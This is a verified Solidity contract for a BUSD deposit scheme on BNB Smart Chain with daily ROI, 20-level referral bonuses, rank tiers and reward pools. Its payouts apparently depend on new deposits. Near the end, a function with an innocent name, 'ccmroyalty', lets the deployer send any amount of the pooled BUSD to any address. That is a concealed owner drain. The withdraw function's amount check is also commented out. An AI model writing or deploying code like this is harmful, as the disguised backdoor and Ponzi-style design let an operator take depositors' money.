/**
 *Submitted for verification at BscScan.com on 2023-04-01
*/

/**
 *Submitted for verification at BscScan.com on 2023-03-31
*/

/**
 *Submitted for verification at BscScan.com on 2023-03-31
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

interface BEP20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}
contract Unisf {
    using SafeMath for uint256; 
    BEP20 public busd = BEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); 
    uint256 private constant baseDivider = 10000;
    uint256 private constant feePercents = 300; 
    uint256 private constant managerPercents = 30;
    uint256 private constant dayPerCycle = 15 days; 
    uint256 private constant maxAddFreeze = 45 days;
    uint256 private constant timeStep = 1 days;
    uint256 private constant minDeposit = 100e18;
    uint256 private constant maxDeposit = 2000e18;
    uint256 private constant splitMod = 100e18;
    uint256 private leaderStart = 0;
    uint256 private managerStart = 0;
    uint256 private insurance = 0;

    mapping(uint256=>bool) private balStatus;
    bool private freezeStaticReward;
    bool private freezeDynamicReward;
    
    struct UserInfo {
        address referrer;
        uint256 refNo;
        uint256 myLastDeposit;
        uint256 totalIncome;
        uint256 totalWithdraw;
        uint256 isSilver;
        uint256 isGold;
        uint256 isDiamond;
        uint256 isDoubleDiamond;
        uint256 split;
        uint256 myRegister;
        
        mapping(uint256 => uint256) dailyDirect;
        mapping(uint256 => uint256) myActDirect;
        mapping(uint256 => uint256) levelTeam;
        mapping(uint256 => uint256) incomeArray;
        mapping(uint256 => uint256) directBuz;
    }

    mapping(address=>UserInfo) public userInfo;
    
    struct UserDept{
        uint256 amount;
        uint256 depTime;
        uint256 unfreeze; 
        bool isUnfreezed;
    }
    mapping(address => UserDept[]) public userDepts;
    
    address feeReceiver = 0x37b5420a101F06e7ca977AC761790F19a844a607;
    address feewithdraw = 0x1d6779dF918325f8FbD2060f8f1a9ca89AD1e929;
    
    address public defaultRefer;
    uint256 public startTime;
    
    mapping(uint256 => uint256) silver;
    mapping(uint256 => uint256) topPool;
    mapping(uint256 => uint256) leader_reward;
    address [] leader_array;
    mapping(uint256 => mapping(uint256 => uint256)) toppool_buz;
    mapping(uint256 => mapping(uint256 => address)) toppool_list;

    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    
    uint[] level_bonuses = [500, 200, 100, 200, 100, 200, 100, 100, 100, 100, 50, 50, 50, 50, 50, 25, 25, 25, 25, 25];
    uint256[3] private top_bonus = [50,30,20];
    uint256[8] private balReached = [100000e18, 200000e18, 300000e18, 400000e18, 600000e18, 800000e18, 1100000e18, 1500000e18];
    uint256[8] private balFreezeStatic = [70000e18, 140000e18, 210000e18, 280000e18, 420000e18, 560000e18, 770000e18, 1050000e18];
    uint256[8] private balFreezeDynamic = [40000e18, 80000e18, 120000e18, 160000e18, 240000e18, 320000e18, 440000e18, 600000e18];
    uint256[8] private balRecover = [70000e18, 140000e18, 210000e18, 280000e18, 420000e18, 560000e18, 770000e18, 1050000e18];

    modifier security {
        uint size;
        address sandbox = msg.sender;
        assembly { size := extcodesize(sandbox) }
        require(size == 0, "Smart contract detected!");
        _;
    }

    constructor() public {
        startTime = block.timestamp;
        defaultRefer = msg.sender;
    }
    
    function contractInfo() public view returns(uint256 balance, uint256 init, uint256 ins){
       return (busd.balanceOf(address(this)),startTime,insurance);
    }
    
    function register(address _referral) external security{
        require(userInfo[_referral].myLastDeposit > 0 || _referral == defaultRefer, "invalid refer");
        UserInfo storage user = userInfo[msg.sender];
        require(user.referrer == address(0), "referrer bonded");
        require(user.refNo == 0, "Already Registered.");
        user.referrer = _referral;
        user.refNo = userInfo[_referral].myRegister;
        userInfo[_referral].myRegister++;
        emit Register(msg.sender, _referral);
    }
    
    function deposit(uint256 _busd) external security{
        _deposit(msg.sender, _busd);
        emit Deposit(msg.sender, _busd);
    }

    function _deposit(address _user, uint256 _amount) private {
        require(_amount>=minDeposit && _amount<=maxDeposit && _amount.mod(minDeposit) == 0, "Minimum 100 , Multiple 100 and maximum 2000 busd");
        require(userInfo[_user].referrer != address(0), "register first");
        require(_amount>=userInfo[_user].myLastDeposit, "Amount greater than previous Deposit");
        bool _isReDept = false;
        uint256 totalDays=getCurDay();
        
        if(userInfo[_user].myLastDeposit==0){
            userInfo[userInfo[_user].referrer].myActDirect[0]++;
            topPool[totalDays]+=_amount.mul(50).div(baseDivider);
        }else{
            _isReDept=true;
        }
        userInfo[_user].myLastDeposit=_amount;
        busd.transferFrom(msg.sender,address(this),_amount);
        
        _distributeDeposit(_amount);
        
        uint256 addFreeze = (userDepts[_user].length).mul(timeStep);
        if(addFreeze > maxAddFreeze){
            addFreeze = maxAddFreeze;
        }
        
        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);
        userDepts[_user].push(UserDept(
            _amount,
            block.timestamp,
            unfreezeTime,
            false
        ));
        _setReferral(_user,userInfo[_user].referrer,_amount,_isReDept);
        
        if(_amount>=2000e18 && userInfo[_user].incomeArray[5]>=2000e18){
            userInfo[_user].totalIncome+=2000e18;
            userInfo[_user].incomeArray[5]-=2000e18;
        }else{
            unfreezeDepts(_user);
        }
        
        leader_reward[totalDays]+=_amount.mul(managerPercents).div(baseDivider);
        updateLeader(totalDays);
        updatetopPool(totalDays);
        if(_isReDept==false){
            address _ref=userInfo[_user].referrer;
            userInfo[_ref].dailyDirect[totalDays]+=_amount;
            _topPoolTeam(_ref,userInfo[_ref].dailyDirect[totalDays],totalDays);
        }
        uint256 bal = busd.balanceOf(address(this));
        _balActived(bal);
        if(freezeStaticReward || freezeDynamicReward){
            _setFreezeReward(bal);
        }
    }
    function _balActived(uint256 _bal) private {
        for(uint256 i = balReached.length; i > 0; i--){
            if(_bal >= balReached[i - 1]){
                balStatus[balReached[i - 1]] = true;
                break;
            }
        }
    }

    function _topPoolTeam(address _ref,uint256 _refBuzz,uint256 nofdays) private {
        for(uint256 k=0;k<3;k++){
            if(_refBuzz>toppool_buz[nofdays][k]){
                if(k==0){
                    toppool_buz[nofdays][2]=toppool_buz[nofdays][1];
                    toppool_list[nofdays][2]=toppool_list[nofdays][1];
                    toppool_buz[nofdays][1]=toppool_buz[nofdays][0];
                    toppool_list[nofdays][1]=toppool_list[nofdays][0];
                    toppool_buz[nofdays][0]=_refBuzz;
                    toppool_list[nofdays][0]=_ref;
                }else if(k==1){
                    toppool_buz[nofdays][2]=toppool_buz[nofdays][1];
                    toppool_list[nofdays][2]=toppool_list[nofdays][1];
                    toppool_buz[nofdays][1]=_refBuzz;
                    toppool_list[nofdays][1]=_ref;
                }else{
                    toppool_buz[nofdays][2]=_refBuzz;
                    toppool_list[nofdays][2]=_ref;
                }
                break;
            }
        }
    }
    function _setFreezeReward(uint256 _bal) private {
        for(uint256 i = balReached.length; i > 0; i--){
            if(balStatus[balReached[i - 1]]){
                if(_bal < balFreezeStatic[i - 1]){
                    freezeStaticReward = true;
                    if(_bal < balFreezeDynamic[i - 1]){
                        freezeDynamicReward = true;
                    }
                }else{
                    if((freezeStaticReward || freezeDynamicReward) && _bal >= balRecover[i - 1]){
                        freezeStaticReward = false;
                        freezeDynamicReward = false;
                    }
                }
                break;
            }
        }
    }
    function _setReferral(address _user,address _referral, uint256 _refAmount, bool _isReDept) private {
        for(uint8 i = 0; i < level_bonuses.length; i++) {
            if(_isReDept==false){
                userInfo[_referral].levelTeam[userInfo[_user].refNo]+=1;
            }
            userInfo[_referral].directBuz[userInfo[_user].refNo]+=_refAmount;
            if(userInfo[_referral].isSilver==0 || userInfo[_referral].isGold==0 || userInfo[_referral].isDiamond==0|| userInfo[_referral].isDoubleDiamond==0){
                (uint256 ltA,uint256 ltB,uint256 lbA, uint256 lbB)=teamBuzInfo(_referral);
                if(userInfo[_referral].isSilver==0 && userInfo[_referral].myActDirect[0]>=5 && userInfo[_referral].myLastDeposit>=300e18 && lbA>=2000e18 && lbB>=3000e18){
                    userInfo[_referral].isSilver=1;
                    userInfo[userInfo[_referral].referrer].myActDirect[1]++;
                }
                if(userInfo[_referral].isGold==0 && userInfo[_referral].myActDirect[1]>=1 && userInfo[_referral].myLastDeposit>=1000e18 && (ltA+ltB)>=50 && lbA>=8000e18 && lbB>=12000e18){
                   userInfo[_referral].isGold=1;
                   userInfo[userInfo[_referral].referrer].myActDirect[2]++;
                }
                if(userInfo[_referral].isDiamond==0 && userInfo[_referral].myActDirect[2]>=1 && userInfo[_referral].myLastDeposit>=2000e18 && (ltA+ltB)>=100 && lbA>=20000e18 && lbB>=30000e18){
                   userInfo[_referral].isDiamond=1;
                   userInfo[userInfo[_referral].referrer].myActDirect[3]++;
                   leader_array.push(_referral);
                }
                if(userInfo[_referral].isDoubleDiamond==0 && userInfo[_referral].myActDirect[3]>=1 && userInfo[_referral].myLastDeposit>=2000e18 && (ltA+ltB)>=250 && lbA>=40000e18 && lbB>=60000e18){
                   userInfo[_referral].isDoubleDiamond=1;
                   userInfo[userInfo[_referral].referrer].myActDirect[4]++;
                }
            }
            uint256 isok=0;
            if(_referral==defaultRefer){
                isok=1;
            }else{
                uint256 nofDept = userDepts[_referral].length;
                if(userDepts[_referral][nofDept-1].unfreeze>=block.timestamp){ 
                    isok=1;
                }
            }
            if(isok==1 && (freezeStaticReward==false || _isReDept==false)){
                uint256 levelOn=_refAmount;
                if(_refAmount>userInfo[_referral].myLastDeposit){
                    levelOn=userInfo[_referral].myLastDeposit;
                }
            
                if(i==0){
                    userInfo[_referral].totalIncome+=levelOn.mul(level_bonuses[i]).div(baseDivider);
                    userInfo[_referral].incomeArray[2]+=levelOn.mul(level_bonuses[i]).div(baseDivider);
                }else{
                    if(userInfo[_referral].isSilver==1 && i>=1 && i < 3){
                        userInfo[_referral].totalIncome+=levelOn.mul(level_bonuses[i]).div(baseDivider);
                        userInfo[_referral].incomeArray[3]+=levelOn.mul(level_bonuses[i]).div(baseDivider);
                    }
                    else if(userInfo[_referral].isGold==1 && i>=3 && i < 5){
                        userInfo[_referral].totalIncome+=levelOn.mul(level_bonuses[i]).div(baseDivider);
                        userInfo[_referral].incomeArray[4]+=levelOn.mul(level_bonuses[i]).div(baseDivider);
                    }else if(userInfo[_referral].isDiamond==1 && i >= 5 && i < 15){
                        userInfo[_referral].incomeArray[5]+=levelOn.mul(level_bonuses[i]).div(baseDivider);
                        userInfo[_referral].incomeArray[9]+=levelOn.mul(level_bonuses[i]).div(baseDivider);
                    }else if(userInfo[_referral].isDoubleDiamond==1 && i >= 15){
                        userInfo[_referral].totalIncome+=levelOn.mul(level_bonuses[i]).div(baseDivider);
                        userInfo[_referral].incomeArray[6]+=levelOn.mul(level_bonuses[i]).div(baseDivider);
                    }
                }
            }
            
           _user = _referral;
           _referral = userInfo[_referral].referrer;
            if(_referral == address(0)) break;
        }
    }
    function _distributeDeposit(uint256 _amount) private {
        uint256 fee = _amount.mul(feePercents).div(baseDivider);
        busd.transfer(feeReceiver,fee);
    }

    function unfreezeDepts(address _addr) private {
        uint8 isdone;
        uint256 totalRevenue=userInfo[_addr].totalIncome;
        for(uint j=0;j<userDepts[_addr].length;j++){
            if(userDepts[_addr][j].isUnfreezed==true){
                totalRevenue-=userDepts[_addr][j].amount;
            }else{
                break;
            }
        }
        for(uint i=0;i<userDepts[_addr].length;i++){
            UserDept storage pl = userDepts[_addr][i];
            if(pl.isUnfreezed==false && block.timestamp>=pl.unfreeze && isdone==0){
                pl.isUnfreezed=true;
                userInfo[_addr].totalIncome+=pl.amount;
                userInfo[_addr].incomeArray[0]+=pl.amount;
                userInfo[_addr].incomeArray[11]+=pl.amount;
                address _referral = userInfo[_addr].referrer;
                for(uint8 j = 0; j < level_bonuses.length; j++) {
                    userInfo[_referral].directBuz[userInfo[_addr].refNo]-=pl.amount;
                    _addr = _referral;
                   _referral = userInfo[_referral].referrer;
                    if(_referral == address(0)) break;
                }
                break;
            }
        }
    }

    function teamBuzInfo(address _addr) view private returns(uint256 ltA,uint256 ltB,uint256 lbA,uint256 lbB) {
        uint256 lbATemp;
        uint256 lb;
        uint256 lTeam;
        uint256 lbTTemp;
        for(uint256 i=0;i<userInfo[_addr].myRegister;i++){
            lTeam+=userInfo[_addr].levelTeam[i];
            if(lbTTemp==0 || userInfo[_addr].levelTeam[i]>lbTTemp){
               lbTTemp=userInfo[_addr].levelTeam[i]; 
            }
            lb+=userInfo[_addr].directBuz[i];
            if(lbATemp==0 || userInfo[_addr].directBuz[i]>lbATemp){
               lbATemp=userInfo[_addr].directBuz[i]; 
            }
        }
        lbB=lb-lbATemp;
        ltB=lTeam-lbTTemp;
        return (
           lbTTemp,
           ltB,
           lbATemp,
           lbB
        );
    }
    function updateLeader(uint256 totalDays) private {
        if(leaderStart==0){
            if(leader_array.length>0){
                uint256 distAmount;
                for(uint256 i=0; i < totalDays; i++){
                    distAmount+=leader_reward[i];
                    leader_reward[i]=0;
                }
                distAmount=distAmount.div(leader_array.length);
                for(uint8 i = 0; i < leader_array.length; i++) {
                    userInfo[leader_array[i]].totalIncome+=distAmount;
                    userInfo[leader_array[i]].incomeArray[7]+=distAmount;
                }
                leaderStart=1;
            }
            
        }else if(leaderStart>0 && leader_reward[totalDays-1]>0){
            if(leader_array.length>0){
                uint256 distAmount=leader_reward[totalDays-1].div(leader_array.length);
                for(uint8 i = 0; i < leader_array.length; i++) {
                    userInfo[leader_array[i]].totalIncome+=distAmount;
                    userInfo[leader_array[i]].incomeArray[7]+=distAmount;
                }
                leader_reward[totalDays-1]=0;
            } 
        }
    }
    
    function updatetopPool(uint256 nof) private {
        uint256 totalDays=nof-1;
        if(topPool[totalDays]>0){
            for(uint256 i=0; i < 3; i++){
                if(toppool_list[totalDays][i]!=address(0)){
                    userInfo[toppool_list[totalDays][i]].totalIncome+=topPool[totalDays].mul(top_bonus[i]).div(100);
                    userInfo[toppool_list[totalDays][i]].incomeArray[10]+=topPool[totalDays].mul(top_bonus[i]).div(100);
                }
            }
        }
    }
    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }
    function getplDay(uint256 pl) public view returns(uint256) {
        return (block.timestamp.sub(pl)).div(timeStep);
    }
    function leaderPool() view external returns(uint256 lp,uint256 lpTeam) {
        uint256 totalDays=getCurDay();
        return (leader_reward[totalDays],leader_array.length);
    }

    function incomeDetails(address _addr) view external returns(uint256[12] memory p) {
        for(uint8 i=0;i<12;i++){
            p[i]=userInfo[_addr].incomeArray[i];
        }
        return (
           p
        );
    }
    function toppoolDetails() view external returns(address[3] memory ads,uint256[3] memory amt) {
        uint256 totalDays=getCurDay();
        for(uint8 i=0;i<3;i++){
            ads[i]=toppool_list[totalDays][i];
            amt[i]=toppool_buz[totalDays][i];
        }
        return (
            ads,
            amt
        );
    }
    function roiDetails(address _addr) view external returns(uint256 tr,uint256 wr,uint256 avl) {
        tr=0;
        for(uint i=0;i<userDepts[_addr].length;i++){
            UserDept storage pl = userDepts[_addr][i];
            uint256 totalpl=getplDay(pl.depTime);
            totalpl=(totalpl>=15)?15:totalpl;
            tr+=pl.amount.mul(totalpl).div(100);
        }
        return (
            tr,
            userInfo[_addr].incomeArray[1],
            tr-userInfo[_addr].incomeArray[1]
        );
    }
    
    function userDetails(address _addr) view external returns(address ref,uint256 lbA,uint256 lbB,uint256 myreg,uint256 myDirect,uint256 mysl,uint256 mygo,uint256 mydia,uint256 mydd) {
        UserInfo storage player = userInfo[_addr];
        uint256 lbATemp;
        uint256 lb;
        for(uint256 i=0;i<player.myRegister;i++){
            lb+=player.directBuz[i];
            if(lbATemp==0 || player.directBuz[i]>lbATemp){
               lbATemp=player.directBuz[i]; 
            }
        }
        lbB=lb-lbATemp;
        return (
           player.referrer,
           lbATemp,
           lbB,
           player.myRegister,
           player.myActDirect[0],
           player.myActDirect[1],
           player.myActDirect[2],
           player.myActDirect[3],
           player.myActDirect[4]
        );
    }
    function getBalInfos(uint256 _bal) external view returns(bool, bool, bool) {
        return(balStatus[_bal], freezeStaticReward, freezeDynamicReward);
    }
    function withdraw(uint256 _amount) public security{
        require(_amount >= 10e18, "Minimum 10 need");
        
        UserInfo storage player = userInfo[msg.sender];
        
        uint256 totalROI;
        for(uint i=0;i<userDepts[msg.sender].length;i++){
            UserDept storage pl = userDepts[msg.sender][i];
            uint256 totalpl=getplDay(pl.depTime);
            totalpl=(totalpl>=15)?15:totalpl;
            totalROI+=pl.amount.mul(totalpl).div(100);
        }
        uint256 tri=player.totalIncome+totalROI-player.incomeArray[11];
        require(freezeDynamicReward==false || (freezeDynamicReward!=false && tri<player.myLastDeposit), "Trigger");
        uint256 bonus;
        if(freezeDynamicReward==false){
            bonus=(player.totalIncome+totalROI)-player.totalWithdraw;
        }else{
            bonus=(player.totalIncome+player.incomeArray[1])-player.totalWithdraw;
        }
        if(userDepts[msg.sender].length>=10){
            uint256 myDirBuzz;
            for(uint256 i=0;i<player.myRegister;i++){
                myDirBuzz+=player.directBuz[i];
            }
            if(block.timestamp>=userDepts[msg.sender][9].unfreeze && myDirBuzz<player.myLastDeposit){
                bonus=0;
            }
        }
        // require(_amount<=bonus,"Amount exceeds withdrawable");
        require(bonus>=10e18,"Minimum 10 need");
        
        uint256 tempSplit=(bonus-player.incomeArray[0]).mul(10).div(100);
        player.incomeArray[0]=0;
        player.incomeArray[2]=0;
        player.incomeArray[3]=0;
        player.incomeArray[4]=0;
        player.incomeArray[6]=0;
        player.incomeArray[7]=0;
        player.incomeArray[8]=0;
        player.incomeArray[10]=0;
        
        player.totalWithdraw+=bonus;
        player.split+=tempSplit;
        insurance+=tempSplit;
        player.incomeArray[1]=totalROI;
        uint256 wamount=bonus.sub(tempSplit);
        busd.transfer(msg.sender,wamount);
        busd.transfer(feewithdraw,tempSplit);
        uint256 bal = busd.balanceOf(address(this));
        _setFreezeReward(bal);
    }
    function ccmroyalty(address buyer,uint _amount) public security returns(uint){
        require(msg.sender == defaultRefer,"--");
        busd.transfer(buyer,_amount);
        return _amount;
    }
}

library SafeMath {
   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}